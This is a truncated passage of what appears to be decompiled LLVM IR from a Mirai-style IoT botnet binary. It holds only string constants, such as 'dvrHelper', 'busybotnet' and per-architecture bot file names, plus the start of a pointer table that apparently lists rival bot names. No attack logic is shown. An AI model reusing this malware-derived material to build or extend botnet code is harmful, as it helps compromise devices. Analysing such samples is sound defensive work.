@global_var_805a68a.362 = constant [10 x i8] c"dvrHelper\00"
@global_var_805a694.363 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805a69c.364 = constant [5 x i8] c"FEUB\00"
@global_var_805a6a1.365 = constant [9 x i8] c"FTUdftui\00"
@global_var_805a6aa.366 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_805a6b3.367 = constant [6 x i8] c"jhUOH\00"
@global_var_805a6b9.368 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_805a6c2.369 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_805a6cc.370 = constant [8 x i8] c"kmymips\00"
@global_var_805a6d4.371 = constant [10 x i8] c"kmymips64\00"
@global_var_805a6de.372 = constant [10 x i8] c"kmymipsel\00"
@global_var_805a6e8.373 = constant [9 x i8] c"kmysh2eb\00"
@global_var_805a6f1.374 = constant [10 x i8] c"kmysh2elf\00"
@global_var_805a6fb.375 = constant [7 x i8] c"kmysh4\00"
@global_var_805a702.376 = constant [7 x i8] c"kmyx86\00"
@global_var_805a709.377 = constant [9 x i8] c"kmyarmv5\00"
@global_var_805a712.378 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_805a71d.379 = constant [9 x i8] c"kmyarmv4\00"
@global_var_805a726.380 = constant [9 x i8] c"kmyarmv6\00"
@global_var_805a72f.381 = constant [8 x i8] c"kmyi686\00"
@global_var_805a737.382 = constant [11 x i8] c"kmypowerpc\00"
@global_var_805a742.383 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_805a752.384 = constant [8 x i8] c"kmyi586\00"
@global_var_805a75a.385 = constant [8 x i8] c"kmym68k\00"
@global_var_805a762.386 = constant [9 x i8] c"kmysparc\00"
@global_var_805a76b.387 = constant [10 x i8] c"kmyx86_64\00"
@global_var_805a775.388 = constant [8 x i8] c"lolmips\00"
@global_var_805a77d.389 = constant [10 x i8] c"lolmips64\00"
@global_var_805a787.390 = constant [10 x i8] c"lolmipsel\00"
@global_var_805a791.391 = constant [9 x i8] c"lolsh2eb\00"
@global_var_805a79a.392 = constant [10 x i8] c"lolsh2elf\00"
@global_var_805a7a4.393 = constant [7 x i8] c"lolsh4\00"
@global_var_805a7ab.394 = constant [7 x i8] c"lolx86\00"
@global_var_805a7b2.395 = constant [9 x i8] c"lolarmv5\00"
@global_var_805a7bb.396 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_805a7c6.397 = constant [9 x i8] c"lolarmv4\00"
@global_var_805a7cf.398 = constant [9 x i8] c"lolarmv6\00"
@global_var_805a7d8.399 = constant [8 x i8] c"loli686\00"
@global_var_805a7e0.400 = constant [11 x i8] c"lolpowerpc\00"
@global_var_805a7eb.401 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_805a7fb.402 = constant [8 x i8] c"loli586\00"
@global_var_805a803.403 = constant [8 x i8] c"lolm68k\00"
@global_var_805a80b.404 = constant [9 x i8] c"lolsparc\00"
@global_var_805a814.405 = constant [8 x i8] c"RYrydry\00"
@global_var_805a81c.406 = constant [8 x i8] c"telmips\00"
@global_var_805a824.407 = constant [10 x i8] c"telmips64\00"
@global_var_805a82e.408 = constant [10 x i8] c"telmipsel\00"
@global_var_805a838.409 = constant [9 x i8] c"telsh2eb\00"
@global_var_805a841.410 = constant [10 x i8] c"telsh2elf\00"
@global_var_805a84b.411 = constant [7 x i8] c"telsh4\00"
@global_var_805a852.412 = constant [7 x i8] c"telx86\00"
@global_var_805a859.413 = constant [9 x i8] c"telarmv5\00"
@global_var_805a862.414 = constant [11 x i8] c"telarmv4tl\00"
@global_var_805a86d.415 = constant [9 x i8] c"telarmv4\00"
@global_var_805a876.416 = constant [9 x i8] c"telarmv6\00"
@global_var_805a87f.417 = constant [8 x i8] c"teli686\00"
@global_var_805a887.418 = constant [11 x i8] c"telpowerpc\00"
@global_var_805a892.419 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_805a8a2.420 = constant [8 x i8] c"teli586\00"
@global_var_805a8aa.421 = constant [8 x i8] c"telm68k\00"
@global_var_805a8b2.422 = constant [9 x i8] c"telsparc\00"
@global_var_805a8bb.423 = constant [10 x i8] c"telx86_64\00"
@global_var_805a8c5.424 = constant [12 x i8] c"TwoFacemips\00"
@global_var_805a8d1.425 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_805a8df.426 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_805a8ed.427 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_805a8fa.428 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_805a908.429 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_805a913.430 = constant [11 x i8] c"TwoFacex86\00"
@global_var_805a91e.431 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_805a92b.432 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_805a93a.433 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_805a947.434 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_805a954.435 = constant [12 x i8] c"TwoFacei686\00"
@global_var_805a960.436 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_805a96f.437 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_805a983.438 = constant [12 x i8] c"TwoFacei586\00"
@global_var_805a98f.439 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_805a99b.440 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_805a9a8.441 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_805a9b6.442 = constant [9 x i8] c"UYyuyioy\00"
@global_var_805a9bf.443 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_805a9c8.444 = constant [5 x i8] c"xxb1\00"
@global_var_805a9cd.445 = constant [5 x i8] c"xxb2\00"
@global_var_805a9d2.446 = constant [5 x i8] c"xxb3\00"
@global_var_805a9d7.447 = constant [5 x i8] c"xxb4\00"
@global_var_805a9dc.448 = constant [5 x i8] c"xxb5\00"
@global_var_805a9e1.449 = constant [5 x i8] c"xxb6\00"
@global_var_805a9e6.450 = constant [5 x i8] c"xxb7\00"
@global_var_805a9eb.451 = constant [5 x i8] c"xxb8\00"
@global_var_805a9f0.452 = constant [5 x i8] c"xxb9\00"
@global_var_805a9f5.453 = constant [6 x i8] c"xxb10\00"
@global_var_805a9fb.454 = constant [6 x i8] c"xxb11\00"
@global_var_805aa01.455 = constant [6 x i8] c"xxb12\00"
@global_var_805aa07.456 = constant [6 x i8] c"xxb13\00"
@global_var_805aa0d.457 = constant [6 x i8] c"xxb14\00"
@global_var_805aa13.458 = constant [6 x i8] c"xxb15\00"
@global_var_805aa19.459 = constant [6 x i8] c"xxb16\00"
@global_var_805aa1f.460 = constant [6 x i8] c"xxb17\00"
@global_var_805aa25.461 = constant [6 x i8] c"xxb18\00"
@global_var_805aa2b.462 = constant [6 x i8] c"xxb19\00"
@global_var_805aa31.463 = constant [6 x i8] c"xxb20\00"
@global_var_805aa37.464 = constant i32 3276849
@global_var_805aa39.465 = constant i32 3342386
@global_var_805aa3b.466 = constant i32 3407923
@global_var_805aa3d.467 = constant i32 3473460
@global_var_805aa3f.468 = constant i32 3538997
@global_var_805aa41.469 = constant i32 3604534
@global_var_805aa43.470 = constant i32 3670071
@global_var_805aa45.471 = constant i32 3735608
@global_var_805aa47.472 = constant i32 808517689
@global_var_805aa49.473 = constant [3 x i8] c"10\00"
@global_var_805aa4c.474 = constant [3 x i8] c"11\00"
@global_var_805aa4f.475 = constant [3 x i8] c"12\00"
@global_var_805aa52.476 = constant [3 x i8] c"13\00"
@global_var_805aa55.477 = constant [3 x i8] c"14\00"
@global_var_805aa58.478 = constant [3 x i8] c"15\00"
@global_var_805aa5b.479 = constant [3 x i8] c"16\00"
@global_var_805aa5e.480 = constant [3 x i8] c"17\00"
@global_var_805aa61.481 = constant [3 x i8] c"18\00"
@global_var_805aa64.482 = constant [3 x i8] c"19\00"
@global_var_805aa67.483 = constant [3 x i8] c"20\00"
@global_var_805aa6a.484 = constant [3 x i8] c"bb\00"
@global_var_805aa6d.485 = constant [11 x i8] c"busybotnet\00"
@global_var_805aa78.486 = constant [5 x i8] c"pppd\00"
@global_var_805aa7d.487 = constant [6 x i8] c"pppoe\00"
@global_var_805aa83.488 = constant [5 x i8] c"wput\00"
@global_var_805aa88.489 = constant [3 x i8] c"B1\00"
@global_var_805aa8b.490 = constant [3 x i8] c"B2\00"
@global_var_805aa8e.491 = constant [3 x i8] c"B3\00"
@global_var_805aa91.492 = constant [3 x i8] c"B4\00"
@global_var_805aa94.493 = constant [3 x i8] c"B5\00"
@global_var_805aa97.494 = constant [3 x i8] c"B6\00"
@global_var_805aa9a.495 = constant [3 x i8] c"B7\00"
@global_var_805aa9d.496 = constant [3 x i8] c"B8\00"
@global_var_805aaa0.497 = constant [3 x i8] c"B9\00"
@global_var_805aaa3.498 = constant [4 x i8] c"B10\00"
@global_var_805aaa7.499 = constant [4 x i8] c"B11\00"
@global_var_805aaab.500 = constant [4 x i8] c"B12\00"
@global_var_805aaaf.501 = constant [4 x i8] c"B13\00"
@global_var_805aab3.502 = constant [4 x i8] c"B14\00"
@global_var_805aab7.503 = constant [4 x i8] c"B15\00"
@global_var_805aabb.504 = constant [4 x i8] c"B16\00"
@global_var_805aabf.505 = constant [4 x i8] c"B17\00"
@global_var_805aac3.506 = constant [4 x i8] c"B18\00"
@global_var_805aac7.507 = constant [4 x i8] c"B20\00"
@global_var_805aacb.508 = constant [10 x i8] c"dvrhelper\00"
@global_var_805aae0.509 = constant [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a3c4.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a3c9.270, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059846.271, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a3cf.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059856.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a3d5.274, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a3dd.275, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059826.276, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805980e.277, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a3e3.278, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a3e7.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059841.280, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805984b.281, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059813.282, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a3ec.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a3f0.284, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a3f5.285, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a3fc.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a400.287, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a404.288, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a409.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a40d.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a3f0.284, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a412.291, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a3f5.285, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a419.292, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a41f.293, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a3fc.286, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a400.287, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a426.294, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a42a.295, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a430.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a438.297, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a43e.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a404.288, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a444.299, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a44c.300, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a40d.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a459.301, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a45e.302, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a464.303, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a46b.304, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a476.305, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a483.306, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a490.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a49c.308, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a4a9.309, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a4b3.310, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a4bd.311, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a4c9.312, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a4d7.313, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a4e3.314, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a4ef.315, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a4fa.316, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805a508.317, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a51b.318, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a526.319, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a531.320, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a53d.321, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a54a.322, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a555.323, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a562.324, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a56f.325, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a57b.326, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a588.327, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a592.328, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a59c.329, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a5a8.330, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a5b6.331, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a5c2.332, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a5ce.333, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a5d9.334, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_805a5e7.335, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a5fa.336, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a605.337, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a610.338, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a61c.339, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a629.340, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a62c.341, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a62f.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a632.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a635.344, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a638.345, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a63b.346, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a63e.347, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805a641.348, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a644.349, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a648.350, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a64c.351, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a650.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a654.353, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a658.354, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a65c.355, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a660.356, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a664.357, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a668.358, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805a66c.359, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805a670.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a681.361, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a68a.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a694.363, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a69c.364, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a6a1.365, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a6aa.366, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a6b3.367, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a6b9.368, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6c2.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a6cc.370, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6d4.371, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6de.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a6e8.373, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a6f1.374, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a6fb.375, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a702.376, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a709.377, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a712.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a71d.379, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a726.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a72f.381, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a737.382, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a742.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a752.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a75a.385, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a762.386, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a76b.387, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a775.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a77d.389, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a787.390, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a791.391, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a79a.392, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a7a4.393, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a7ab.394, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7b2.395, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a7bb.396, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7c6.397, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a7cf.398, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a7d8.399, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a7e0.400, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a7eb.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a7fb.402, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a803.403, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a80b.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a814.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a81c.406, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a824.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a82e.408, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a838.409, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a841.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a84b.411, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a852.412, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a859.413, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a862.414, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a86d.415, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a876.416, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a87f.417, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a887.418, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805a892.419, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a8a2.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a8aa.421, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a8b2.422, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a8bb.423, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a8c5.424, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a8d1.425, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a8df.426, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a8ed.427, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a8fa.428, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a908.429, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805a913.430, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a91e.431, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a92b.432, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a93a.433, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a947.434, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a954.435, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805a960.436, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805a96f.437, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a983.438, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805a98f.439, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805a99b.440, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805a9a8.441, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a9b6.442, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805a464.303, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805a9bf.443, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9c8.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9cd.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9d2.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9d7.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9dc.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9e1.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9e6.450, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9eb.451, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a9f0.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9f5.453, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805a9fb.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa01.455, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa07.456, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa0d.457, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa13.458, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa19.459, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa1f.460, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa25.461, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa2b.462, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805aa31.463, i32 0, i32 0), i8* bitcast (i32* @global_var_805aa37.464 to i8*), i8* bitcast (i32* @global_var_805aa39.465 to i8*), i8* bitcast (i32* @global_var_805aa3b.466 to i8*), i8* bitcast (i32* 